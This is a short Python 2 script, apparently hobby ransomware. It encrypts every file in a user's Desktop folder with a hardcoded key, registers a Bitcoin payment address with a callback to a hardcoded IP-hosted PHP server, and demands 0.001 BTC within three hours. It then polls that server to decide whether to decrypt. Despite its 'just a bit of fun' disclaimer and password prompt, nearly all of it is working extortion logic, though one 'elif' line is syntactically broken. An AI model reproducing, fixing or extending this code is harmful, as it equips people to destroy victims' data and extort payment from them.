#just to add this is just a bit of fun, i would not consider using this.

import random
import time
import json
import encryptionManager
import requests


rootDirectionary = 'C:\\users\\JohnJoe\\Desktop\\'#everything in this directory will be encrypted
key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
#I cant find a way to generate a 16 byte key, in python. So im using this for now



password = raw_input("Oh god dont do this accidentally, whats the password: ")  #@UndefinedVariable this is here to make sure that 
#I dont accidently start this on my own computer

if password != "basil":
    exit()


filesChanged = encryptionManager.manage(0, rootDirectionary, key)#encrypts the files
             




        
"""
You can put anything you want here. For example you could create a bitcoin wallet with an API,
and decrypt the files once an amount of bitcoins has been transfered to it. 

"""

params = {
          "method": "create",
          "address": "1QHjy2cUAWbd5S1ZLtD7EsXYtHQ4g6VM9U",
          "callback": "http://79.170.40.237/bot.com/code/bitcoinManager.php"
          }

response = requests.get("http://blockchain.info/api/receive", params=params)
print response.text
print response.url
jsonResponse = response.json()
print("Send 0.001btc to"+ jsonResponse["input_address"])
time.sleep(3)
print("You have three hours to send the bitcoin")

for i in range(100):
    time.sleep(10)
    responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php")
    jsonPaid = responsePaid.json()
    if jsonPaid["paid"] == 1:
        encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
    elif:
        print("Nothing paid yet")    


exit()        
        
        